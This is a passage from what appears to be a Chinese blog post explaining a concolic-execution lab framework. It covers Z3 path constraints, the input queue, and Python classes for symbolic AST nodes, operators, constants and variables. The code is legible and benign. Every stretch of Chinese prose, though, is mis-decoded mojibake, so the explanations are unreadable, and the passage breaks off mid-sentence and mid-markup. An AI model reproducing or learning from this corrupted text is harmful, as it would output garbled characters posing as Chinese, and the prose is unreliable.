inputsï¼‰ï¼šåœ¨æ··åˆæ‰§è¡Œä¸‹è¢«æµ‹è¯•çš„ç¨‹åºè¾“å…¥éƒ½å­˜å‚¨åœ¨ <code>concrete_values</code> å­—å…¸ä¸­ï¼Œåœ¨è¯¥å­—å…¸ä¸­å­˜å‚¨äº†ç¨‹åºè¾“å…¥çš„å­—ç¬¦ä¸²åå­—ï¼Œå¹¶å°†æ¯ä¸ªåå­—æ˜ å°„åˆ°å¯¹åº”çš„è¾“å…¥å€¼ï¼ˆæ•´å‹å˜é‡çš„å€¼ä¸ºpythonæ•´å‹ï¼Œå­—ç¬¦ä¸²å˜é‡ä¸ºpythonå­—ç¬¦ä¸²ï¼‰</p><p><code>concrete_value</code> è¢«è®¾ä¸ºå…¨å±€å˜é‡çš„åŸå› æ˜¯åº”ç”¨é€šè¿‡è°ƒç”¨ <code>fuzzy.mk_str(name)</code> æˆ– <code>fuzzy.mk_int(name)</code> æ¥åˆ›å»ºä¸€ä¸ªæ··åˆå­—ç¬¦ä¸²æˆ–æ··åˆæ•´å‹ï¼Œå…¶è¿”å›ä¸€ä¸ªæ··åˆå€¼ï¼Œå…¶ä¸­çš„ç¬¦å·éƒ¨åˆ†ä¸ºä¸€ä¸ªæ–°çš„ AST èŠ‚ç‚¹å¯¹åº”åˆ°ä¸€ä¸ªåä¸º <code>name</code> çš„å˜é‡ï¼Œä½†å…·ä½“å€¼è¢«åœ¨ <code>concrete_values</code> ä¸­æŸ¥æ‰¾ï¼Œè‹¥å­—å…¸ä¸­æ²¡æœ‰ä¸ä¹‹å…³è”çš„å˜é‡ï¼Œç³»ç»Ÿå°†å…¶è®¾ä¸ºé»˜è®¤çš„åˆå§‹å€¼ï¼ˆæ•´å‹ä¸º0ï¼Œå­—ç¬¦ä¸²ä¸ºç©ºä¸²ï¼‰</p><p>æ··åˆæ‰§è¡Œæ¡†æ¶åœ¨ä¸€ä¸ª <code>InputQueue</code> å¯¹è±¡ä¸­ç»´æŒä¸€ä¸ªå¾…å°è¯•çš„ä¸åŒè¾“å…¥çš„é˜Ÿåˆ—ï¼Œæ¡†æ¶é¦–å…ˆä¼šæ·»åŠ ä¸€ä¸ªåˆå§‹è¾“å…¥ï¼ˆç©ºå­—å…¸ <code>&#123;&#125;</code>ï¼‰ï¼Œä¹‹åæ‰§è¡Œä»£ç ï¼Œè‹¥åº”ç”¨è¿›å…¥äº†åˆ†æ”¯ï¼Œæ··åˆæ‰§è¡Œç³»ç»Ÿå°†å”¤é†’ Z3 æ¥å¸¦æ¥ æ–°çš„è¾“å…¥ä»¥æµ‹è¯•ä»£ç ä¸­çš„å…¶ä»–åˆ†æ”¯ï¼Œå°†è¿™äº›è¾“å…¥æ”¾åˆ°è¾“å…¥é˜Ÿåˆ—ä¸­ï¼Œå¹¶ä¿æŒè¿­ä»£ç›´åˆ°æ²¡æœ‰è¾“å…¥å¯ä»¥å°è¯•</p></li><li><p><strong>å¯æ»¡è¶³æ€§æ¨¡ç†è®ºæ±‚è§£å™¨</strong>ï¼ˆThe SMT solverï¼‰ï¼š <code>fork_and_check(c)</code> å‡½æ•°ä¼šæ£€æŸ¥çº¦æŸ <code>c</code> ï¼ˆä¸€ä¸ª AST èŠ‚ç‚¹ï¼‰æ˜¯å¦ä¸ºå¯æ»¡è¶³çš„è¡¨è¾¾å¼ï¼Œå¹¶è¿”å›ä¸€å¯¹å€¼ï¼šå¯æ»¡è¶³æ€§çŠ¶æ€ <code>ok</code> åŠç¤ºä¾‹æ¨¡å‹ï¼ˆåˆ†é…ç»™å˜é‡çš„å€¼ï¼‰ï¼Œè‹¥çº¦æŸå¯ä»¥è¢«æ»¡è¶³åˆ™ <code>ok</code> ä¸º <code>z3.sat</code> ï¼Œè‹¥çº¦æŸä¸å¯è¢«æ»¡è¶³åˆ™ <code>ok</code> ä¸º <code>z3.unsat</code> æˆ– <code>z3.unknown</code>ï¼›è¯¥å‡½æ•°å†…éƒ¨ä¼š fork ä¸€ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æ¥è¿è¡Œ Z3 æ±‚è§£å™¨ï¼Œè‹¥è€—æ—¶è¶…è¿‡ <code>z3_timeout</code> åˆ™æ€æ­»è¿›ç¨‹å¹¶è¿”å› <code>z3.unknown</code></p></li><li><p><strong>å½“å‰è·¯å¾„æ¡ä»¶</strong>ï¼ˆThe current path conditionï¼‰ï¼šå½“åº”ç”¨æ‰§è¡Œå¹¶åŸºäºæ··åˆå€¼å†³å®šæ§åˆ¶æµæ—¶ï¼ˆå‚è§ä¸Šé¢å…³äº <code>concolic_bool</code> çš„è®¨è®ºï¼‰ï¼Œè¡¨ç¤ºè¯¥åˆ†æ”¯çš„çº¦æŸä¼šè¢«æ·»åŠ åˆ° <code>cur_path_constr</code> åˆ—è¡¨ä¸­ï¼Œä¸ºäº†ç”Ÿæˆèƒ½å¤Ÿæ²¿ç€ä¸€æ¡åˆ†æ”¯ä»ä¸€ä¸ªç‚¹è¿›è¡Œä¸åŒé€‰æ‹©çš„è¾“å…¥ï¼Œæ‰€éœ€çš„çº¦æŸä¸ºè·¯å¾„ä¸Šè¯¥ç‚¹ä¹‹å‰çš„çº¦æŸé›†åˆï¼ŒåŠ ä¸Šè¯¥ç‚¹çš„åå‘çº¦æŸï¼›ä¸ºäº†å¸®åŠ©è°ƒè¯•ä¸å¯å‘å¼æœç´¢ï¼Œè§¦å‘äº†åˆ†æ”¯çš„ä»£ç è¡Œçš„ä¿¡æ¯ä¼šè¢«å­˜æ”¾åœ¨ <code>cur_path_constr_callers</code> åˆ—è¡¨ä¸­</p></li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬çš„å·¥ä½œæ˜¯å®Œæˆå¯¹ <code>concolic_int</code> çš„å®ç°ï¼Œå¹¶å°†ä»£ç åº”ç”¨äºæ··åˆæ‰§è¡Œå¾ªç¯çš„æ ¸å¿ƒï¼Œæœ¬ Lab æä¾›äº†ä¸¤ä¸ªæµ‹è¯•ç¨‹åºï¼š <code>check-concolic-int.py</code> ä¸ <code>check-symex-int.py</code></p><h3 id="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-1"><a href="#æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ-Part-1" class="headerlink" title="æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 1"></a>æ··åˆæ‰§è¡Œæ¡†æ¶ä»£ç æµ…æ  - Part 1</h3><p>åœ¨åš Exercise ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªæ··åˆæ‰§è¡Œæ¡†æ¶çš„ä»£ç ç»“æ„ï¼Œå…¶æ ¸å¿ƒä»£ç ä¸»è¦ä½äº <code>symex/fuzzy.py</code> ä¸­</p><h4 id="I-AST-èŠ‚ç‚¹"><a href="#I-AST-èŠ‚ç‚¹" class="headerlink" title="I. AST èŠ‚ç‚¹"></a>I. AST èŠ‚ç‚¹</h4><p>é¦–å…ˆæ˜¯ AST èŠ‚ç‚¹ï¼Œä½œä¸ºæ‰€æœ‰ç¬¦å·ç±»çš„çˆ¶ç±»è€Œå­˜åœ¨ï¼Œå®šä¹‰æ¯”è¾ƒç®€å•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_ast</span>(<span class="hljs-title class_ inherited__">object</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(self._z3expr())<br></code></pre></td></tr></table></figure><h4 id="II-ç¬¦å·è¿ç®—"><a href="#II-ç¬¦å·è¿ç®—" class="headerlink" title="II. ç¬¦å·è¿ç®—"></a>II. ç¬¦å·è¿ç®—</h4><p>ç„¶åæ˜¯ <code>sym_func_apply</code> ç±»ï¼Œä½œä¸ºæ‰€æœ‰ç¬¦å·æ“ä½œçš„çˆ¶èŠ‚ç‚¹ï¼Œè¿™é‡Œä¸»è¦é‡è½½äº† <code>__eq__()</code> å’Œ <code>__hash__()</code> æ–¹æ³•ï¼Œç”¨äºæ¯”è¾ƒä¸è®¡ç®—å“ˆå¸Œå€¼ï¼Œæ¯”è¾ƒçš„æ–¹æ³•å°±æ˜¯åˆ¤æ–­æ˜¯å¦æ‰€æœ‰å‚æ•°ç›¸ç­‰ï¼Œå“ˆå¸Œå€¼çš„è®¡ç®—åˆ™æ˜¯æ‰€æœ‰å‚æ•°çš„å“ˆå¸Œå€¼è¿›è¡Œå¼‚æˆ–ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_func_apply</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args</span>):<br>    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> args:<br>      <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(a, sym_ast):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Passing a non-AST node %s %s as argument to %s&quot;</span> % \<br>                        (a, <span class="hljs-built_in">type</span>(a), <span class="hljs-built_in">type</span>(self)))<br>    self.args = args<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(self) != <span class="hljs-built_in">type</span>(o):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.args) != <span class="hljs-built_in">len</span>(o.args):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(sa == oa <span class="hljs-keyword">for</span> (sa, oa) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.args, o.args))<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> functools.reduce(operator.xor, [<span class="hljs-built_in">hash</span>(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ä¸‰ä¸ªç±» <code>sym_unop</code> ã€<code>sym_binop</code> ã€<code>sym_triop</code>ï¼Œè¡¨ç¤ºå¸¦æœ‰1ã€2ã€3ä¸ªæ“ä½œæ•°çš„å°è£…ï¼Œå¯ä»¥ä½¿ç”¨ <code>a</code> ã€<code>b</code> ã€<code>c</code> è·å¾—ç¬¬ 1ã€2ã€3ä¸ªæ“ä½œæ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_unop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a</span>):<br>    <span class="hljs-built_in">super</span>(sym_unop, self).__init__(a)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_binop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b</span>):<br>    <span class="hljs-built_in">super</span>(sym_binop, self).__init__(a, b)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_triop</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, a, b, c</span>):<br>    <span class="hljs-built_in">super</span>(sym_triop, self).__init__(a, b, c)<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">a</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">1</span>]<br><br><span class="hljs-meta">  @property</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">c</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.args[<span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><p>åŸºäº <code>sym_func_apply</code> ä¸ <code>op</code> ç±»ï¼Œå°è£…äº†ç›¸ç­‰æ¯”è¾ƒã€ä¸ã€æˆ–ã€éå››ä¸ªæ“ä½œï¼Œå…¶å®ç°åŸç†ä¸»è¦è¿˜æ˜¯è½¬æˆ Z3 è¡¨è¾¾å¼ååˆ©ç”¨ Z3 çš„ä¸æˆ–éè¿›è¡Œè¿ç®—ï¼šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Logic expressions</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_eq</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) == z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_and</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.And(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_or</span>(<span class="hljs-title class_ inherited__">sym_func_apply</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Or(*[z3expr(a) <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> self.args])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_not</span>(<span class="hljs-title class_ inherited__">sym_unop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Not(z3expr(self.a))<br></code></pre></td></tr></table></figure><p>ç¬¦å·æ•°çš„åŠ å‡ä¹˜é™¤æ¯”è¾ƒç­‰æ“ä½œéƒ½æ˜¯åŸºäºä¸Šé¢å°è£…çš„ <code>op</code> ç±»å®Œæˆçš„ï¼š</p><blockquote><p>ä¹˜é™¤ç­‰è¿ç®—éœ€è¦æˆ‘ä»¬åœ¨åç»­çš„ Exercise ä¸­è‡ªè¡Œå®ç°</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_lt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &lt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_gt</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) &gt; z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_plus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) + z3expr(self.b)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_minus</span>(<span class="hljs-title class_ inherited__">sym_binop</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3expr(self.a) - z3expr(self.b)<br></code></pre></td></tr></table></figure><h4 id="III-å¸¸é‡"><a href="#III-å¸¸é‡" class="headerlink" title="III. å¸¸é‡"></a>III. å¸¸é‡</h4><p>å­—ç¬¦ä¸²å¸¸é‡ <code>const_str</code> ã€æ•´å‹å¸¸é‡ <code>const_int</code> ã€å¸ƒå°”å¸¸é‡ <code>const_bool</code> çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯ç»§æ‰¿è‡ª <code>sym_ast</code> å¹¶ä¸”å‚¨å­˜å¯¹åº”çš„å€¼ï¼Œå…¶ä¸­å­—ç¬¦ä¸²å¸¸é‡åœ¨è½¬ä¸º Z3 è¡¨è¾¾å¼æ—¶ä¼šè°ƒç”¨ <code>z3.StringVal()</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, v</span>):<br>    self.v = v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.v == o.v<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.v)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.StringVal(self.v)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, i</span>):<br>    self.i = i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.i == o.i<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.i)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.i<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">const_bool</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, b</span>):<br>    self.b = b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, const_bool):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.b == o.b<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.b)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> self.b<br></code></pre></td></tr></table></figure><h4 id="IV-ç¬¦å·å˜é‡"><a href="#IV-ç¬¦å·å˜é‡" class="headerlink" title="IV. ç¬¦å·å˜é‡"></a>IV. ç¬¦å·å˜é‡</h4><p>åœ¨è¯¥æ¡†æ¶ä¸­å®šä¹‰äº†ä¸¤ç§ç±»å‹çš„ç¬¦å·å˜é‡ï¼š<code>sym_int</code> ä¸ <code>sym_str</code>ï¼Œéƒ½æ˜¯ç›´æ¥åŸºç¡€è‡ª AST èŠ‚ç‚¹ç±»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Arithmetic</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_int</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_int):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Int(self.<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment">###...</span><br><br><span class="hljs-comment">## String operations</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">sym_str</span>(<span class="hljs-title class_ inherited__">sym_ast</span>):<br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, <span class="hljs-built_in">id</span></span>):<br>    self.<span class="hljs-built_in">id</span> = <span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__eq__</span>(<span class="hljs-params">self, o</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(o, sym_str):<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> self.<span class="hljs-built_in">id</span> == o.<span class="hljs-built_in">id</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__hash__</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>(self.<span class="hljs-built_in">id</span>)<br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">_z3expr</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> z3.Const(self.<span class="hljs-built_in">id</span>, z3.StringSort())<br></code></pre></td></tr></table></figure><h4 id="V-æ··åˆå˜é‡"><a href="#V-æ··åˆå˜é‡" class="headerlink" title="V. æ··åˆå˜é‡"></a>V. æ··åˆå˜é‡</h4><p>æ­£å¦‚å‰æ–‡æ‰€è¨€ï¼Œæˆ‘ä»¬å®é™…ä¸Šåœ¨æ··åˆæ‰§è¡Œå¼•æ“å½“ä¸­ä½¿ç”¨çš„ä¸ºæ··åˆå‹ï¼ˆconcolicï¼‰çš„å˜é‡æ¥å‚¨å­˜çº¦æŸå€¼ï¼Œæ¡†æ¶ä¸­æä¾›äº†ä¸‰ç§ç±»å‹çš„æ··åˆå˜é‡â€”â€”<code>concolic_int</code> ï¼ˆæ•´å‹ï¼‰ã€ <code>concolic_str</code>ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€<code>concolic_bytes</code>ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰ï¼Œå…¶ä¸­å…·ä½“å€¼ï¼ˆconctre valueï¼‰å­˜æ”¾åœ¨ <code>__v</code> æˆå‘˜ä¸­ï¼Œç¬¦å·å€¼ï¼ˆsymbolic valueï¼‰å­˜æ”¾åœ¨ <code>__sym</code> ä¸­</p><p>ä¸»è¦æ˜¯<strong>å¤§é‡çš„è¿ç®—ç¬¦é‡è½½</strong>ï¼Œè¿™é‡Œå°±ä¸è´´å®Œæ•´ä»£ç äº†ï¼Œå¯ä»¥è‡ªå·±å»çœ‹ï¼ˆç¬‘ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 